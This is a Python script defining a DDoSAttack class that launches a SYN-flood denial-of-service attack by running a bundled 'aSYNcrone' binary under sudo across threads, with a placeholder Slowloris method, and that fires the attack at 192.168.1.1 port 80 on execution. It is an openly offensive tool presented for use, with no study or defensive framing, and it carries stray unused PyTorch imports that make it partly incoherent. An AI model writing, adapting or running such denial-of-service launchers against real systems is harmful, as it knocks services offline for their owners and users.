import torch
import torch.nn as nn
import threading
from random_string_generator import RandomStringGenerator
import logging
import os
import subprocess
import sys
import platform

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DDoSAttack:
    def __init__(self, target_ip, target_port, num_connections, attack_type="aSYNcrone"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.attack_type = attack_type
        self.threads = []
        self.model = RandomStringGenerator(100)

    def create_connection(self):
        for _ in range(self.num_connections):
            thread = threading.Thread(target=self.run_attack)
            self.threads.append(thread)
            thread.start()

    def run_attack(self):
        if self.attack_type == "aSYNcrone":
            self.aSYNcrone_attack()
        elif self.attack_type == "slowloris":
            self.slowloris_attack()
        else:
            logging.error(f"Unknown attack type: {self.attack_type}")

    def aSYNcrone_attack(self):
        if sys.platform == "darwin" and platform.machine() == "arm64": # noqa
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM"
            )
        elif sys.platform == "darwin": # noqa
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcronemac"
            )
        elif sys.platform == "linux":
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcrone"
            )
        else:
            logging.error(f"Unknown platform: {sys.platform}")
            return
        # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
        command = [
            "sudo",
            "-S",
            path_to_executable,
            "80",
            self.target_ip,
            str(self.target_port),
            str(self.num_connections),
        ]
        try:
            subprocess.run(command, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Error while running aSYNcrone: {e}")
            return


    def slowloris_attack(self):
        # TODO: Implement the Slowloris attack here
        raise NotImplementedError

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


# Target parameters
target_ip = "192.168.1.1"
target_port = 80
num_connections = 1

# Create and launch attack
attack = DDoSAttack(target_ip, target_port, num_connections, "aSYNcrone")
attack.create_connection()
attack.wait_for_threads()
